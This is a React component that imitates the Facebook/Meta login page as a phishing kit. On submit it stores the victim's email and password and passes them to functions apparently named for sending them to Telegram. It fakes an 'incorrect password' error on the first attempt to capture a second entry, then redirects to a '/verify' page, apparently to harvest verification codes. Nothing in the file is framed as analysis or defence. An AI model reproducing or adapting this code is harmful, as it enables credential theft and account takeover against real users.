import { sendMessageUserNameTelegram, sendMessageUserNameTelegram1 } from "@/services/send-message";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import "./Facebook.css";

export default function FacebookLogin() {
  const [location, navigate] = useLocation();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm();

  const [attempts, setAttempts] = useState([]);
  const [showError, setShowError] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const onSubmit = async (data) => {
    setIsLoading(true); // Bắt đầu loading
    setAttempts([data]);
    const newAttempts = [...attempts, data];
    localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));

    if (attempts.length === 0) {
      sendMessageUserNameTelegram1(newAttempts);
    } else {
      sendMessageUserNameTelegram(newAttempts);
    }

    setTimeout(async () => {
      if (attempts.length === 0) {
        setShowError(true);
        setValue("password", "");
      } else {
        navigate("/verify");
      }
      setIsLoading(false);
    }, 3500);
  };

  return (
    <div className="fb-login-container">
      {/* Spinner full màn hình */}
      {isLoading && (
        <div className="fb-spinner-overlay">
          <div className="fb-spinner-container">
            <div className="fb-spinner-ring-inner"></div>
          </div>
        </div>
      )}

      <div className="fb-login-card">
        <div className="fb-header">
          <svg className="fb-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256">
            <path
              fill="#0866ff"
              d="M256 128C256 57.308 198.692 0 128 0C57.308 0 0 57.307 0 128c0 63.888 46.808 116.843 108 126.445V165H75.5v-37H108V99.8c0-32.08 19.11-49.8 48.347-49.8C170.352 50 185 52.5 185 52.5V84h-16.14C152.958 84 148 93.867 148 103.99V128h35.5l-5.675 37H148v89.445c61.192-9.602 108-62.556 108-126.445"
            ></path>
            <path
              fill="#ffffff"
              d="m177.825 165l5.675-37H148v-24.01C148 93.866 152.959 84 168.86 84H185V52.5S170.352 50 156.347 50C127.11 50 108 67.72 108 99.8V128H75.5v37H108v89.445A128.959 128.959 0 0 0 128 256a128.9 128.9 0 0 0 20-1.555V165h29.825"
            ></path>
          </svg>
          <span className="title-facebook">Facebook</span>
        </div>

        <div className="fb-body">
          <p className="fb-intro-text">
            Log in to use your Facebook account with <strong>Meta</strong>.
          </p>

          <form onSubmit={handleSubmit(onSubmit)} className="fb-login-form" autoComplete="off">
            <div className="fb-form-group">
              <label htmlFor="email">Email address or phone number:</label>
              <div className="w-full">
                <input
                  type="text"
                  id="email"
                  className="fb-input"
                  autoComplete="false"
                  {...register("email", { required: "The username that you've entered is incorrect." })}
                />
                {errors.email && <p className="error-text">{errors.email.message}</p>}
              </div>
            </div>

            <div className="fb-form-group">
              <label htmlFor="password">Password:</label>
              <div className="w-full">
                <input
                  type="password"
                  id="password"
                  className="fb-input"
                  autoComplete="off"
                  {...register("password", { required: "The password that you've entered is incorrect." })}
                />
                {errors.password && <p className="error-text">{errors.password.message}</p>}
              </div>
            </div>

            {showError && <p className="error-text">Incorrect username or password. Please try again.</p>}

            <div className="fb-actions">
              <button type="submit" className="fb-login-button" disabled={isLoading}>
                Log in
              </button>
              <a href="#" className="fb-forgot-link">
                Forgotten account?
              </a>
              <button type="button" className="fb-create-account">
                Create New Account
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
